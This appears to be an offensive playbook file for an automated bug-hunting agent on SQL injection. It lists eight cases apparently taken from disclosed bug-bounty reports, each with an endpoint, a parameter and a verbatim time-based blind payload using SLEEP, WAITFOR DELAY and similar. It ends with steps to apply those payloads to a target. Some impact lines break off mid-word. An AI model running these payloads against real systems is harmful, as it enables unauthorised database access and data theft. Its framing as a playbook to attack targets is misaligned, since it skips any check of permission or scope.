---
name: hunter-l4-sql-injection
description: "Detect and exploit SQL injection with real payloads and techniques."
domain: cybersecurity
subdomain: web
tags:
- web
- sql-injection
- hunting
- l4
version: '1.0'
---
# L4 Playbook: SQL Injection (hunter)

**L3 technique sheet:** `knowledge/sheets/sql-injection.md` — (pending L3 synthesis)

## When to use
Attack a target surface for SQL Injection. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 198292 [ajaysenr]
- endpoint: `POST / (news.starbucks.com)`
- parameter: `group_id,ACT,site_id,jsontree`
- payload: `ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1`
- root cause: Missing parameter sanitization allows injecting SQL into the group_id value, executed in a sleep-based boolean context.
- impact: Confirmed time-based blind SQLi: 4.945s response with IF(1=1,SLEEP(1),0) vs 0.860s with the false condition, and extracted the DBMS version major digi

### 1024984 [ajaysenr]
- endpoint: `GET /{redacted}/library.php`
- parameter: `c`
- payload: `'XOR(if(now()=sysdate(),sleep(1*1),0))OR'`
- root cause: The c parameter is concatenated into a SQL query without sanitization, allowing sleep-based blind injection.
- impact: Confirmed time-based blind SQLi: response times scaled with the sleep value (2,077ms for sleep(1*1); 4,599ms and 9,989ms for the sleep(2*2) variants) 

### 1015406 [ajaysenr]
- endpoint: `POST /{path}`
- parameter: `rnum`
- payload: `N/A (POST body redacted; OFFSET clause injection)`
- root cause: The rnum parameter was concatenated into the SQL OFFSET clause without parameterization.
- impact: Confirmed SQLi in the OFFSET clause (different rows returned per injection); could dump usernames/password hashes or perform auth bypass.

### 1018621 [ajaysenr]
- endpoint: `GET /{path}/Chart01.php?alert=`
- parameter: `Referer (header)`
- payload: `'+(select*from(select(if(1=1,sleep(20),false)))a)+'`
- root cause: The Referer header value was concatenated into a SQL query without sanitization.
- impact: Time-based blind SQLi confirmed — a true condition triggered a 20-second sleep; extracted the first character of the database name ('m').

### 1034625 [ajaysenr]
- endpoint: `POST /api/v1/token`
- parameter: `refresh_token`
- payload: `'; WAITFOR DELAY '0:0:13'--`
- root cause: The refresh_token parameter is concatenated into a SQL query without parameterization; MSSQL WAITFOR DELAY executes.
- impact: Time-based blind SQL injection confirmed (13-second delay versus 2-second baseline); could be used to exfiltrate data from the FTP server, bypass auth

### 1039315 [ajaysenr]
- endpoint: `GET /reader_api/stories.php`
- parameter: `search`
- payload: `0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg`
- root cause: The search parameter is concatenated into a SQL query without parameterization (MySQL backend).
- impact: Time-based blind SQL injection confirmed (5-second sleep); backend DBMS is MySQL.

### 1042746 [ajaysenr]
- endpoint: `GET /changeReplaceOpt.php`
- parameter: `acctid`
- payload: `419523%20AND%20SLEEP(15)`
- root cause: The acctid parameter is concatenated into a SQL query without sanitization, proven via time-based SLEEP().
- impact: Proven time-based SQL injection: responses delayed 15.4s/7.5s with SLEEP(15)/SLEEP(7), and database() revealed as id_commxn2s; full database access ho

### 1044698 [ajaysenr]
- endpoint: `GET /js/commentAction/`
- parameter: `acctid`
- payload: `251219%20AND%20SLEEP(15)%23`
- root cause: The acctid value inside the JSON data param is interpolated into a SQL query without sanitization, proven via time-based SLEEP().
- impact: Proven time-based SQL injection: responses delayed 15.4s/7.6s with SLEEP(15)/SLEEP(7); full database access holding private user information.

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

